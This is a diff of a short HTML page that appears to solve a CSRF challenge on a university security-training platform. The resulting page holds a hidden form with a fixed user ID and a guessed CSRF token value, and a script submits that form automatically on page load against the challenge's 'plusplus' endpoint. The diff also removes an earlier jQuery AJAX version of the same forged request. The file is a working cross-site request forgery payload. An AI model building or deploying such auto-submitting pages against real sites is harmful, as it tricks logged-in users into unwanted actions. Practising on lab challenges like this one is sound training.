@@ -1,35 +1,11 @@
 <!DOCTYPE html>
-<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
-<!--
+
 <form name="csrfForm" action="https://snickerboa.it.liu.se/user/csrfchallengefive/plusplus" method="POST">
 <input type="hidden" name="userId" value="09b532b01c801fd7c25b83fad47c7e8df894b588" />
-<input type="hidden" name="csrfToken" value="75928336271529089346409579781883273376" />
+<input type="hidden" name="csrfToken" value="2" />
 <input type="submit"/>
 </form>
--->
-<form id="myForm" action="https://snickerboa.it.liu.se/user/csrfchallengefive/plusplus" method="post">
 
-    <input type="submit" value="submit">
-</form>
-
-<div id="resultsDiv">
-
-</div>
 <script>
-// document.csrfForm.submit();
-$("#myForm").submit(function() {
-    var ajaxcall = $.ajax({
-        dataType: "text",
-        type: 'POST',
-        url : 'https://snickerboa.it.liu.se/user/csrfchallengefive/plusplus',
-        data : {
-            userId: "09b532b01c801fd7c25b83fad47c7e8df894b588"
-        },
-        async: false
-    });
-    if (ajaxcall.status == 200)
-    {
-        alert(ajaxCall.responseText);
-    }
-});
+document.csrfForm.submit();
 </script>
